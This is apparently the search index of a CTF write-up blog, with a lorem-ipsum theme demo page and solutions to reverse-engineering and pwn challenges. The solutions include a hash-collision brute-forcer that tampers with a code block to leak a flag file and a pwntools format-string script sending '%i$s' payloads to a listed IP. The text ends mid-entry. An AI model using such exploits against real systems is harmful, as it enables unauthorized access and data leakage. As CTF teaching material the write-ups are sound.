{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"index.html#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"index.html#project-layout","title":"Project layout","text":"Text Only<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"tags.html","title":"Tags","text":""},{"location":"tags.html#2022","title":"2022","text":"<ul> <li>Weird Code</li> </ul>"},{"location":"tags.html#2023","title":"2023","text":"<ul> <li>Git Better</li> <li>format_string ftw</li> <li>Seed</li> <li>Three Sum</li> <li>Chocolate Cake</li> <li>Nest</li> <li>Keasy</li> <li>Matrix</li> </ul>"},{"location":"tags.html#bcactf","title":"bcactf","text":"<ul> <li>Git Better</li> </ul>"},{"location":"tags.html#coderush","title":"coderush","text":"<ul> <li>format_string ftw</li> <li>Seed</li> <li>Three Sum</li> </ul>"},{"location":"tags.html#crypto","title":"crypto","text":"<ul> <li>Git Better</li> </ul>"},{"location":"tags.html#flaghunt","title":"flaghunt","text":"<ul> <li>Weird Code</li> <li>Chocolate Cake</li> <li>Nest</li> <li>Keasy</li> <li>Matrix</li> </ul>"},{"location":"tags.html#mkdocs","title":"mkdocs","text":"<ul> <li>Hello World</li> </ul>"},{"location":"tags.html#pwn","title":"pwn","text":"<ul> <li>format_string ftw</li> <li>Seed</li> <li>Three Sum</li> </ul>"},{"location":"tags.html#python","title":"python","text":"<ul> <li>Weird Code</li> </ul>"},{"location":"tags.html#rand","title":"rand","text":"<ul> <li>Seed</li> </ul>"},{"location":"tags.html#rev","title":"rev","text":"<ul> <li>Weird Code</li> <li>Git Better</li> <li>Chocolate Cake</li> <li>Nest</li> <li>Keasy</li> <li>Matrix</li> </ul>"},{"location":"tags.html#web","title":"web","text":"<ul> <li>Git Better</li> </ul>"},{"location":"tags.html#xor","title":"xor","text":"<ul> <li>Weird Code</li> </ul>"},{"location":"blog/posts/hello-world.html","title":"Hello World","text":"<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> title of note <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> I'm an annotation! I can contain <code>code</code>, formatted     text, images, ... basically anything that can be expressed in Markdown.</li> </ol> <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> <p> I'm an annotation! (1)</p> <ol> <li> I'm an annotation as well!</li> </ol> </li> </ol> <p>Phasellus posuere in sem ut cursus (1)</p> <p>Lorem ipsum dolor sit amet, (2) consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <ol> <li> I'm an annotation!</li> <li> I'm an annotation as well!</li> </ol> Tab 1Tab 2 <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> I'm an annotation!</li> </ol> <p>Phasellus posuere in sem ut cursus (1)</p> <ol> <li> I'm an annotation as well!</li> </ol> <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> I'm an annotation!</li> </ol> CC++Unordered listOrdered list C<pre><code>#include &lt;stdio.h&gt;\nint main(void) {\nprintf(\"Hello world!\\n\");\nreturn 0;\n}\n</code></pre> C++<pre><code>#include &lt;iostream&gt;\nint main(void) {\nstd::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\nreturn 0;\n}\n</code></pre> <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> <p>Example</p> Unordered ListOrdered List Markdown<pre><code>* Sed sagittis eleifend rutrum\n* Donec vitae suscipit est\n* Nulla tempor lobortis orci\n</code></pre> Markdown<pre><code>1. Sed sagittis eleifend rutrum\n2. Donec vitae suscipit est\n3. Nulla tempor lobortis orci\n</code></pre> <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];</code></pre> <pre><code>sequenceDiagram\n  autonumber\n  Alice-&gt;&gt;John: Hello John, how are you?\n  loop Healthcheck\n      John-&gt;&gt;John: Fight against hypochondria\n  end\n  Note right of John: Rational thoughts!\n  John--&gt;&gt;Alice: Great!\n  John-&gt;&gt;Bob: How about you?\n  Bob--&gt;&gt;John: Jolly good!</code></pre> <pre><code>stateDiagram-v2\n  state fork_state &lt;&lt;fork&gt;&gt;\n    [*] --&gt; fork_state\n    fork_state --&gt; State2\n    fork_state --&gt; State3\n\n    state join_state &lt;&lt;join&gt;&gt;\n    State2 --&gt; join_state\n    State3 --&gt; join_state\n    join_state --&gt; State4\n    State4 --&gt; [*]</code></pre> <pre><code>classDiagram\n  Person &lt;|-- Student\n  Person &lt;|-- Professor\n  Person : +String name\n  Person : +String phoneNumber\n  Person : +String emailAddress\n  Person: +purchaseParkingPass()\n  Address \"1\" &lt;-- \"0..1\" Person:lives at\n  class Student{\n    +int studentNumber\n    +int averageMark\n    +isEligibleToEnrol()\n    +getSeminarsTaken()\n  }\n  class Professor{\n    +int salary\n  }\n  class Address{\n    +String street\n    +String city\n    +String state\n    +int postalCode\n    +String country\n    -validate()\n    +outputAsLabel()\n  }</code></pre> <pre><code>erDiagram\n  CUSTOMER ||--o{ ORDER : places\n  ORDER ||--|{ LINE-ITEM : contains\n  LINE-ITEM {\n    string name\n    int pricePerUnit\n  }\n  CUSTOMER }|..|{ DELIVERY-ADDRESS : uses</code></pre> <p>Lorem ipsum1 dolor sit amet, consectetur adipiscing elit.2</p> <p>Text can be deleted and replacement text added. This can also be combined into onea single operation. Highlighting is also possible and comments can be added inline.</p> <p>Formatting can also be applied to blocks by putting the opening and closing tags on separate lines and adding new lines between the tags and the content.</p> <ul> <li>This was marked</li> <li>This was inserted</li> <li> <p>This was deleted</p> </li> <li> <p>H2O</p> </li> <li>ATA</li> </ul> <p>Ctrl+Alt+Del</p> <ul> <li> HTML for content and structure</li> <li> JavaScript for interactivity</li> <li> CSS for text running out of boxes</li> <li> Internet Explorer ... huh?</li> </ul> <ul> <li> <p> Set up in 5 minutes</p> <p>Install <code>mkdocs-material</code> with <code>pip</code> and get up and running in minutes</p> <p> Getting started</p> </li> <li> <p> It's just Markdown</p> <p>Focus on your content and generate a responsive and searchable static site</p> <p> Reference</p> </li> <li> <p> Made to measure</p> <p>Change the colors, fonts, language, icons, logo and more with a few lines</p> <p> Customization</p> </li> <li> <p> Open Source, MIT</p> <p>Material for MkDocs is licensed under MIT and available on [GitHub]</p> <p> License</p> </li> </ul> <p> HTML for content and structure</p> <p> JavaScript for interactivity</p> <p> CSS for text running out of boxes</p> <p> Internet Explorer ... huh?</p> Unordered listOrdered list <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> Content tabs<pre><code>=== \"Unordered list\"\n\n    * Sed sagittis eleifend rutrum\n    * Donec vitae suscipit est\n    * Nulla tempor lobortis orci\n\n=== \"Ordered list\"\n\n    1. Sed sagittis eleifend rutrum\n    2. Donec vitae suscipit est\n    3. Nulla tempor lobortis orci\n</code></pre> Unordered listOrdered list <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> <p> </p> Image caption <p> </p> <ul> <li> <p>Nulla et rhoncus turpis. Mauris ultricies elementum leo. Duis efficitur   accumsan nibh eu mattis. Vivamus tempus velit eros, porttitor placerat nibh   lacinia sed. Aenean in finibus diam.</p> <ul> <li>Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis.</li> <li>Nam vulputate tincidunt fringilla.</li> <li>Nullam dignissim ultrices urna non auctor.</li> </ul> </li> <li> <p>Vivamus id mi enim. Integer id turpis sapien. Ut condimentum lobortis     sagittis. Aliquam purus tellus, faucibus eget urna at, iaculis venenatis     nulla. Vivamus a pharetra leo.</p> <ol> <li> <p>Vivamus venenatis porttitor tortor sit amet rutrum. Pellentesque aliquet     quam enim, eu volutpat urna rutrum a. Nam vehicula nunc mauris, a     ultricies libero efficitur sed.</p> </li> <li> <p>Morbi eget dapibus felis. Vivamus venenatis porttitor tortor sit amet     rutrum. Pellentesque aliquet quam enim, eu volutpat urna rutrum a.</p> <ol> <li>Mauris dictum mi lacus</li> <li>Ut sit amet placerat ante</li> <li>Suspendisse ac eros arcu</li> </ol> </li> </ol> </li> </ul> <code>Lorem ipsum dolor sit amet</code> <p>Sed sagittis eleifend rutrum. Donec vitae suscipit est. Nullam tempus tellus non sem sollicitudin, quis rutrum leo facilisis.</p> <code>Cras arcu libero</code> <p>Aliquam metus eros, pretium sed nulla venenatis, faucibus auctor ex. Proin ut eros sed sapien ullamcorper consequat. Nunc ligula ante.</p> <p>Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis. Nam vulputate tincidunt fringilla. Nullam dignissim ultrices urna non auctor.</p> <ul> <li> Lorem ipsum dolor sit amet, consectetur adipiscing elit</li> <li> Vestibulum convallis sit amet nisi a tincidunt<ul> <li> In hac habitasse platea dictumst</li> <li> In scelerisque nibh non dolor mollis congue sed et metus</li> <li> Praesent sed risus massa</li> </ul> </li> <li> Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque</li> </ul> \\[ \\operatorname{ker} f=\\{g\\in G:f(g)=e_{H}\\}{\\mbox{.}} \\] <p>The homomorphism \\(f\\) is injective if and only if its kernel is only the singleton set \\(e_G\\), because otherwise \\(\\exists a,b\\in G\\) with \\(a\\neq b\\) such that \\(f(a)=f(b)\\).</p> <p>Hover me</p> <p>Hover me</p> <p></p> <p>The HTML specification is maintained by the W3C.</p> <ol> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.\u00a0\u21a9</p> </li> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.\u00a0\u21a9</p> </li> </ol>","tags":["mkdocs"]},{"location":"writeups/2022/flaghunt/rev/weird_code/index.html","title":"Weird Code","text":"","tags":["rev","flaghunt","2022","xor","python"]},{"location":"writeups/2022/flaghunt/rev/weird_code/index.html#description","title":"Description","text":"<p>Can you find the flag from the file attached?</p> File_contents Text Only<pre><code>  3           0 LOAD_CONST               1 (4919)\n              2 STORE_FAST               0 (k)\n\n  4           4 LOAD_CONST               2 ('CTF_BD{__REDACTED__}')\n              6 STORE_FAST               1 (flag)\n\n  5           8 BUILD_LIST               0\n             10 STORE_FAST               2 (n)\n\n  6          12 LOAD_GLOBAL              0 (range)\n             14 LOAD_GLOBAL              1 (len)\n             16 LOAD_FAST                1 (flag)\n             18 CALL_FUNCTION            1\n             20 LOAD_CONST               3 (1)\n             22 BINARY_SUBTRACT\n             24 CALL_FUNCTION            1\n             26 GET_ITER\n        &gt;&gt;   28 FOR_ITER                46 (to 76)\n             30 STORE_FAST               3 (i)\n\n  7          32 LOAD_FAST                2 (n)\n             34 LOAD_METHOD              2 (append)\n      k       36 LOAD_FAST                0 (k)\n             38 LOAD_GLOBAL              3 (ord)\n             40 LOAD_FAST                1 (flag)\n             42 LOAD_FAST                3 (i)\n             44 BINARY_SUBSCR\n             46 CALL_FUNCTION            1\n             48 LOAD_GLOBAL              3 (ord)\n             50 LOAD_FAST                1 (flag)\n             52 LOAD_FAST                3 (i)\n             54 LOAD_CONST               3 (1)\n             56 BINARY_ADD\n             58 BINARY_SUBSCR\n             60 CALL_FUNCTION            1\n             62 BINARY_XOR\n             64 LOAD_CONST               4 (4)\n             66 BINARY_LSHIFT\n             68 BINARY_XOR\n             70 CALL_METHOD              1\n             72 POP_TOP\n             74 JUMP_ABSOLUTE           28\n\n  8     &gt;&gt;   76 LOAD_GLOBAL              4 (print)\n             78 LOAD_CONST               5 ('n = ')\n             80 LOAD_FAST                2 (n)\n             82 CALL_FUNCTION            2\n             84 POP_TOP\n             86 LOAD_CONST               0 (None)\n             88 RETURN_VALUE\n\nn =  [4679, 4631, 4775, 4839, 4951, 4295, 4487, 4519, 4439, 4839, 4231, 5095, 5959, 5623, 4855, 5127, 5751, 5703, 6103]\n</code></pre>","tags":["rev","flaghunt","2022","xor","python"]},{"location":"writeups/2022/flaghunt/rev/weird_code/index.html#solution","title":"Solution","text":"<p>The goal is to reverse engineer the flag from the output list <code>n</code>. The sauce is to understand what each instruction do and decompile the source into python code ourselves. Most of the instructions are easily understandable and most of us become confused about what <code>BINARY_SUBSCR</code> does and how <code>CALL_FUNCTION</code> works.</p> <p><code>BINARY_SUBSCR</code>: It stands for <code>binary subscript</code>. It does the job of index in a list. It takes in two parameters: the <code>name of the list</code> and the <code>index</code> of the item.</p> <p><code>CALL_FUNCTION</code>: It calls the function on top of the stack with the parameters passed to it in the stack. An example would be a fast way to learn. Consider offset 14-18 in the source code.</p> Text Only<pre><code>             14 LOAD_GLOBAL              1 (len)\n             16 LOAD_FAST                1 (flag)\n             18 CALL_FUNCTION            1\n</code></pre> <p>The <code>len</code> function is loaded on the stack first then it's parameter <code>flag</code>. So, the overall call stands for <code>len(flag)</code>. This is also true for operations involving more than one operands or parameters like <code>XOR</code> <code>ADD</code> <code>SUBTRACT</code>, etc. Similarly, we keep decompiling the source. You should decompile the rest by yourselves before continuing.</p> Decompiled_source Python<pre><code>k = 4919\nflag = 'CTF_BD{__REDACTED__}'\nn = []\nfor i in range(len(flag)-1):\nn.append(k ^ ((ord(flag[i]) ^ ord(flag[i + 1])) &lt;&lt; 4))\nprint('n = ',n)\n</code></pre> Solution Python<pre><code>k = 4919\nn = [4679, 4631, 4775, 4839, 4951, 4295, 4487, 4519, 4439, 4839, 4231, 5095, 5959, 5623, 4855, 5127, 5751, 5703, 6103]\nflag = 'C'\nfor i in range(len(n)):\nflag += chr((k ^ n[i]) &gt;&gt; 4 ^ ord(flag[i]))\nprint(flag)\n</code></pre> <p>flag: <code>CTF_BD{Py_Byt3_C0d3}</code></p>","tags":["rev","flaghunt","2022","xor","python"]},{"location":"writeups/2023/bcactf/rev/git_better/index.html","title":"Git Better","text":"<p>points: 200</p>","tags":["rev","bcactf","2023","crypto","web"]},{"location":"writeups/2023/bcactf/rev/git_better/index.html#description","title":"Description","text":"<p>We at BCACTF aspire to be unique. ~me That's why we decided to use our own \u2728proprietary\u2728 VCS for this year's challenges. It's a new and more efficient1 way to manage challenge versions, using The Blockchain\u2122.</p> <p>If you're a cryptocurrency person though, this chain of blocks may disappoint you. But we here at BCACTF aspire to be unique, (see above,) and so we will do what we want and NOT what the users want.</p> <p>Either way, we have a bit of an embarrassing situation on our hands. We just built our new flag validator, and in the process of copying the repository to the production server, we ran into a little issue... and lost one of our blocks.</p> <p>So would you uh... be willing to copy that over? I'm on vacation, and you seem to be a part of the new workplace family, so I'm sure you'd be happy to help us out, right?</p> <p>So would you be willing to copy over this block archive to the server? If you do that, I'd even give you \u2728exclusive\u2728 access to the proprietary repository protocols.</p> <p>Just please don't tamper with it, okay? Actually, I don't trust you. Blockchains are immutable for security purposes.</p> <p>Now go get that second block in, okay?</p> <p>Author: skysky</p>","tags":["rev","bcactf","2023","crypto","web"]},{"location":"writeups/2023/bcactf/rev/git_better/index.html#resources","title":"Resources","text":"<p>challs.bcactf.com:31499</p> <p>git_better.tar.gz</p> <p>lost_block.txt</p>","tags":["rev","bcactf","2023","crypto","web"]},{"location":"writeups/2023/bcactf/rev/git_better/index.html#solution","title":"Solution","text":"<p>The challange takes us to a webpage that looks like this:</p> <p></p> <p>As we can see, we were given a portal so that we can submit the block that was lost. We were also given the lost block. This is the output when we submit the lost block.</p> <p></p> <p>Now let's try to understand what the server does.</p> <p>We were given a tarball of the server:</p> Text Only<pre><code>chall_tar/\n\u251c\u2500\u2500 base\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 block.ts\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 hashing.ts\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 repository.ts\n\u2514\u2500\u2500 server\n    \u251c\u2500\u2500 index.html\n    \u2514\u2500\u2500 index.ts\n</code></pre>","tags":["rev","bcactf","2023","crypto","web"]},{"location":"writeups/2023/bcactf/rev/git_better/index.html#the-server","title":"The server","text":"<p>The basic functionality of the html is as follows:</p> HTML<pre><code>&lt;div class=\"main\"&gt;\n&lt;h1&gt;We appreciate your help and cooperation&lt;/h1&gt;\n&lt;h3&gt;Enter the block here&lt;/h3&gt;\n&lt;textarea id=\"block-input\" class=\"input\"&gt;&lt;/textarea&gt;\n&lt;button onmousedown=\"requestResponse()\" class=\"submit-button\"&gt;Submit&lt;/button&gt;\n&lt;div id=\"output\" class=\"output-area\" /&gt;\n&lt;/div&gt;\n</code></pre> <p>As we can see the page takes <code>block-input</code> as input and sends to the server.</p> <p>There are many things going on in the server side for handling the post request as we can see from this part of <code>server.ts</code> file.</p> TypeScript<pre><code>server.post(\n\"/submit\",\nasync (req, res) =&gt; {\nconst body = req.body;\nif (typeof body !== \"string\") {\nres.status(400).send(\"Bad Body\");\nreturn;\n}\nconsole.log(\"Submit req recieved with body:\", body.slice(0, 1024));\nconst buffer = Buffer.from(body);\nconst block = bufToBlock(buffer);\nif (!block) {\nres.status(400).send(\"Malformed Block\");\nreturn;\n}\nconst repo = fromBlocks([\nbufToBlock(Buffer.from(recievedBlocks[0][1]))!,\nblock,\nbufToBlock(Buffer.from(recievedBlocks[1][1]))!,\nbufToBlock(Buffer.from(recievedBlocks[2][1]))!,\n]);\nconst output = build(repo);\nif (!output) {\nres.status(400).send(\"Corruption or tampering detected...\\n\\nHOW DARE YOUUUUU..........\");\nreturn;\n}\nconst controller = spawn(\"deno\", [\"run\", \"--allow-read=./flag.txt\", \"-\"]);\ncontroller.stdin.write(output.toString(\"ascii\") + \"\\n\");\ncontroller.stdin.end();\ncontroller.stderr.pipe(process.stderr, { end: false });\nres.write(\"Output:\\n\");\ncontroller.stdout.pipe(res);\n}\n)\n</code></pre> <p>The server follows the following algorithm:</p> <ul> <li>Recieve the post input from the request as a buffer.</li> <li>Create a block out of it.</li> <li>Create a repository from the blocks and the input block as the second block.     &gt; We also see a predifined array of blocks named <code>recievedBlocks</code> of size 3.     &gt; These are the blocks that the server already has and the lost block is the one that they lost.</li> <li>Build the repo.</li> <li>Run the repo as a deno script.     &gt; This script is supposedly their flag validator.</li> <li>Send the output of the script run as the response.</li> </ul> <p>The webpage loads the response into the bottom textbox where we see the output for providing the lost block is <code>Flag Matches</code>. So the flag validator works as expected for the right input.</p> <p>Let's see if it can detect if we corrupted the lost block.</p> <p></p> <p>As we can see, it can indeed detect if we corrupted the lost block.</p> <p>Let's understand how the <code>build(repo)</code> function works.</p> TypeScript<pre><code>export const build = (repo: Repository): Buffer | null =&gt; {\nconst listOfBlocksToExecute = [];\nlet currBlock = repo.mostRecent;\nwhile (currBlock !== 0n) {\nconst data = repo.blocks.get(currBlock);\nif (!data) return null;\nconst block = bufToBlock(Buffer.from(data));\nif (!block) return null;\nlistOfBlocksToExecute.unshift(block);\ncurrBlock = block.prevHash;\n}\nconst array = listOfBlocksToExecute.reduce((curr, block) =&gt; execBlock(curr, block), [] as number[]);\nreturn Buffer.from(array);\n};\n</code></pre> <p>The function takes in a <code>Repository</code> type as a parameter and returns an array buffer after executing all the blocks. So, the blocks are units of execution and repository is a collection of blocks.</p> <p>The <code>Repository</code> is defined like below:</p> TypeScript<pre><code>interface Repository {\nblocks: Map&lt;bigint, string&gt;;\nmostRecent: bigint;\n}\n</code></pre> <p>The collection of blocks is a map that maps a bigint to a string. The bigint being the hash of the string i.e. the block buffer. <code>mostRecent</code> is a tracker to the most recent block recieved. We can see in the build function that a list of blocks to execute is being made with the most recent block as the first block. Also, each block contains a hash of the previous block which is used to create the list.</p> <p>Now let's see how a block is defined.</p> TypeScript<pre><code>export interface Block {\nprevHash: bigint;\nchanges: Change[];\n}\n</code></pre> <p>Also let's see how a change is defined.</p> TypeScript<pre><code>export interface Change {\nindex: number;\nremove: number;\ninsert: Uint8Array;\n}\n</code></pre> <p>After seeing a conversion from block to buffer or buffer to block function, it becomes clear how a string is converted to a block and verified.</p> <p>The server uses a custom hash function to generate a hash for the blocks. the custom hash function is as follows:</p> TypeScript<pre><code>export let modPrime = 261557n;\nexport let powerPrime = 1933n;\nexport const setSpecialPrime = (n: bigint) =&gt; modPrime = n;\nexport const setPowerPrime = (n: bigint) =&gt; powerPrime = n;\nconst myHashFunction = (data: Buffer) =&gt; {\nlet currentHash: bigint = 0n;\nfor (let i = 0n; i &lt; data.byteLength; i++) {\nconst byte = data[Number(i)];\ncurrentHash ^= (powerPrime ** BigInt(byte) * i) % modPrime;\n}\nreturn currentHash;\n};\nexport default myHashFunction;\n</code></pre> <p>We can see that the <code>modPrime</code> despite being a bigint is actually a very small number. So the <code>myHashFunction</code> is vulnerable to simple brute-force attack. Now we know we can modify the <code>lost_block</code> and can still get the script to execute.</p> <p>But before all that, as we now have the full understanding of how everything works, let's build the original flag checker repo from the right blocks.</p> TypeScript<pre><code>import {readFileSync as readFile} from 'node:fs';\nconst filePath = \"./flag.txt\";\n// Actually read the flag file.\nconst fileData = readFile(filePath, \"utf8\");\n// Fixed the mismatched bracket issue.\nconst flagValidatorRegex = /bcactf\\\\{[a-zA-Z0-9_\\\\-]\\\\}/;\nif (fileData.trim().match(flagValidatorRegex)) {\nconsole.log(\"Flag Matches\");\n} else {\nconsole.log(\"Flag does NOT match :(\");\nconsole.log(\"Flag:\", fileData);\n}\n</code></pre> <p>So, We will only be able to get the flag if the flag does not match the regex. We can corrupt the regex as we can modify the lost_block.</p> <p>All we need to do now is to write a brute-force to create a block that will give the same hash.</p> <p>The following python function does the job:</p> Python<pre><code>#!/usr/bin/env python\nmod_prime = 261557\npower_prime = 1933\ndef my_hash_function(data):\ncurrent_hash = 0\nfor i in range(len(data)):\nbyte = ord(data[i])\ncurrent_hash ^= (power_prime ** byte * i) % mod_prime\nreturn current_hash\nbuf = '0000000000000000000000000003a05b|2:[@7a-0+2(5c7d)][@47-0+27(2f2f20466978656420746865206d69736d61746368656420627261636b65742069737375652e0a)]'\nhash = my_hash_function(buf)\nfor i in range(0xffff):\nnew_buf = f'0000000000000000000000000003a05b|2:[@7a-0+2({hex(i)[2:]})][@47-0+27(2f2f20466978656420746865206d69736d61746368656420627261636b65742069737375652e0a)]'\nnew_hash = my_hash_function(new_buf)\nif new_buf != buf and new_hash == hash:\nbuf = new_buf\nprint(new_buf)\nprint(new_hash)\nexit()\n</code></pre> <p>The output:</p> Text Only<pre><code>0000000000000000000000000003a05b|2:[@7a-0+2(ac87)][@47-0+27(2f2f20466978656420746865206d69736d61746368656420627261636b65742069737375652e0a)]\n</code></pre> <p>Submit the block and get the flag</p> <p></p> <p>Note: <code>Git Even Better</code> uses a large prime as the modPrime. There is another way to get a hash collision but that has to do with cryptography. Apparantly the hashing algorithm is also vulnerable to some degree.</p>","tags":["rev","bcactf","2023","crypto","web"]},{"location":"writeups/2023/coderush/pwn/format_string/index.html","title":"format_string ftw","text":"","tags":["pwn","coderush","2023"]},{"location":"writeups/2023/coderush/pwn/format_string/index.html#description","title":"Description","text":"<p>No one should see what I have in stack! Its only mine!</p> <p><code>nc 139.59.0.163 7777</code></p> <p>Author: <code>peace_ranger</code></p>","tags":["pwn","coderush","2023"]},{"location":"writeups/2023/coderush/pwn/format_string/index.html#solution","title":"Solution","text":"<p>We are only given a connection information. we can connect to this via netcat. as this is a black box challenge where the clues are given in the challenge name and description, nothing else need to be said. The following exploit should work just fine:</p> Python<pre><code>#!/usr/bin/env python\nfrom pwn import *\nfor i in range(1,200):\np = remote(\"139.59.0.163\",7777)\nx = f'%{i}$s'\np.recvline()\np.sendline(bytes(x,\"UTF-8\"))\nprint(p.recvline())\n</code></pre>","tags":["pwn","coderush","2023"]},{"location":"writeups/2023/coderush/pwn/seed/index.html","title":"Seed","text":"","tags":["pwn","coderush","2023","rand"]},{"location":"writeups/2023/coderush/pwn/seed/index.html#description","title":"Description","text":"<p>Let's play a game where I guess a number and you tell what it is. If you can correctly tell me what my guess is I will give you my precious flag.</p> <p><code>nc 139.59.0.163 5336</code></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code>Let's play a game where I guess a number and you tell what it is.</p> <p>seed</p>","tags":["pwn","coderush","2023","rand"]},{"location":"writeups/2023/coderush/pwn/seed/index.html#solution","title":"Solution","text":"<p>We are given a binary seed file. Let's load it up with Ghidra.</p> Ghidra_witchery C<pre><code>int main(void)\n{\nuint __seed;\nint r;\nlong in_FS_OFFSET;\nint input;\nint i;\nFILE *file;\nchar flag [72];\nlong local_10;\nlocal_10 = *(in_FS_OFFSET + 40);\n__seed = rand();\nsrand(__seed);\nputs(\"How many seeds do i have?\");\nfor (i = 0; i &lt; 100; i += 1) {\n__isoc99_scanf(&amp;PTR_DAT_00102022,&amp;input);\nr = rand();\nif (r % 100000 != input) {\nputs(&amp;PTR_DAT_00102022 + 3);\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nputs(\"You must be lucky\");\n}\nfile = fopen(\"flag.txt\",\"r\");\nif (file == NULL) {\nputs(\"flag not found.\");\nputs(\"If you are running this on the remote server, contact the admin immediately.\");\nputs(\n\"If you are running this on your local machine, create a flag.txt with a dummy flag for  debugging purpose.\"\n);\nfflush(stdout);\n/* WARNING: Subroutine does not return */\nexit(0);\n}\nfgets(flag,59,file);\nprintf(\"It cannot be!\\n(;_;)\\nMy precious flag: %s\\n\",flag);\nif (local_10 != *(in_FS_OFFSET + 40)) {\n/* WARNING: Subroutine does not return */\n__stack_chk_fail();\n}\nreturn 0;\n}\n</code></pre> <p>So, What we need to do is match with the server and output the same random number that the server generates. This is pretty easy. We just need to know one basic thing that the sequence of random numbers depends on the seed that is given to the random number generator. The c random number generator always defaults to some seed for which the random number that it starts with is always the same no matter the hardware or software. Thus, the first random number is always the same. If that number is used as seed, we get the same sequence. let us generate the same sequence by re-producing the main function in <code>sol.c</code>.</p> <p></p> <p></p> <p>flag: 